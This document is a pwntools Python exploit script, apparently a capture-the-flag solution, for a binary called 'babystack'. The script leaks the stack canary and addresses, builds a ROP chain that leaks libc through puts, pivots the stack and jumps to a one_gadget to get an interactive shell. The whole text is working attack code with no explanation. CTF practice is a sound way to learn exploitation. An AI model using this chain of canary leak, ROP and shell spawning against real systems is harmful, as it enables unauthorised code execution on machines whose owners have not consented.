#!/usr/bin/env python

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
#p = process("./babystack")
binf = ELF("/home/babystack/babystack")
libc = binf.libc
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('/home/babystack/babystack')

gs = '''
start
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"


p=start()
#pause()

p.sendafter("Name: \n", "A"*1)
#p.sendafter("Hello, please give me your token: \n", "B"*0x10)
p.sendafter("Hello, please give me your token: \n", "deadbeef")

payload = "A"*9
p.sendafter("str1: \n", payload)

p.recvuntil("A"*9)
canary = u64("\x00" + p.recv(7))
stack = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success(hex(stack))
success(hex(canary))

p.sendafter("str2: \n", "A"*(0x8))
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak - 0x3c5641
one = base + 0x4527a
success(hex(leak))

payload = "\x00"+"A"*(0x10-1)
p.sendafter("str1: \n", payload)

payload = p32(0x40)
payload += p32(0xffffff00)
payload += p64(0)*4
payload += p64(canary)
payload += p64(stack+0x30+0x28)   #sfp

p.sendafter("str2: \n", payload)

sleep(1)
payload = p64(0x0401169)
payload += p64(stack-0x30+0x48)
payload += p64(0x00000000004011E5)
p.send(payload)

#payload = "A"*0x9

#p.sendafter("str1: \n", payload)
sleep(1)
#p.send(payload)

payload = p64(0x004014bb)
payload += p64(binf.got['puts'])
payload += p64(binf.plt['puts'])
payload += p64(0x004014bb)
payload += p64(binf.got['puts'])
payload += p64(binf.plt['strlen'])
payload += p64(0x004014bb)
payload += p64(0)
payload += p64(0x004014b9)
payload += p64(stack+0x18)
payload += p64(1)
payload += p64(binf.plt['read'])

p.send(payload)
sleep(0.1)
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak-libc.symbols['puts']
one = base + 0x106ef8
success(hex(base))
#p.sendafter("str2: \n", payload)

payload = "A"*0x60
payload += p64(one)
payload += p64(0)*0x20
p.send(payload)
#p.send(p64(one))

p.interactive()